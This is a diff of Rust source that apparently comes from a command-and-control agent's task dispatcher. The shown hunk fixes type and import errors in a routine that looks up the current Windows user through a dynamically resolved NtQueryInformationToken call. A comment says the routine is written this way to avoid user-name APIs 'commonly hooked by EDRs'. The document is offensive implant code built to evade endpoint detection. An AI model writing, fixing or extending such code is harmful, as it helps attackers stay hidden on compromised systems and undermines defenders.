@@ -1885,16 +1885,16 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             // Avoids GetUserNameA/W/Ex which are commonly hooked by EDRs.
             let who = unsafe {
                 use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-                use windows_sys::Win32::Security::{OpenThreadToken, OpenProcessToken, TOKEN_QUERY,
-                    LookupAccountSidW};
-                use windows_sys::Win32::System::Threading::{GetCurrentThread, GetCurrentProcess};
-                type NtQITFn = unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
+                use windows_sys::Win32::Security::{TOKEN_QUERY, LookupAccountSidW};
+                use windows_sys::Win32::System::Threading::{
+                    GetCurrentThread, GetCurrentProcess, OpenThreadToken, OpenProcessToken};
+                type NtQITFn = unsafe extern "system" fn(isize, u32, *mut u8, u32, *mut u32) -> i32;
                 let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
                 let mut result = String::new();
                 if ntdll != 0 {
                     if let Some(f) = GetProcAddress(ntdll, b"NtQueryInformationToken\0".as_ptr()) {
                         let f: NtQITFn = std::mem::transmute(f);
-                        let mut h_tok: usize = 0;
+                        let mut h_tok: isize = 0;
                         if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 1, &mut h_tok) == 0 {
                             OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_tok);
                         }
@@ -1904,14 +1904,14 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                             if needed > 0 {
                                 let mut buf = vec![0u8; needed as usize];
                                 if f(h_tok, 1, buf.as_mut_ptr(), needed, &mut needed) == 0 {
-                                    // TOKEN_USER: first usize is PSID
+                                    // TOKEN_USER: first pointer-sized value is PSID
                                     let sid = *(buf.as_ptr() as *const usize);
                                     let mut name_buf = [0u16; 256];
                                     let mut dom_buf  = [0u16; 256];
                                     let mut name_len: u32 = 256;
                                     let mut dom_len:  u32 = 256;
-                                    let mut sid_type: u32 = 0;
-                                    if LookupAccountSidW(std::ptr::null(), sid as *const _,
+                                    let mut sid_type: i32 = 0;
+                                    if LookupAccountSidW(std::ptr::null(), sid as *mut _,
                                             name_buf.as_mut_ptr(), &mut name_len,
                                             dom_buf.as_mut_ptr(),  &mut dom_len,
                                             &mut sid_type) != 0 {
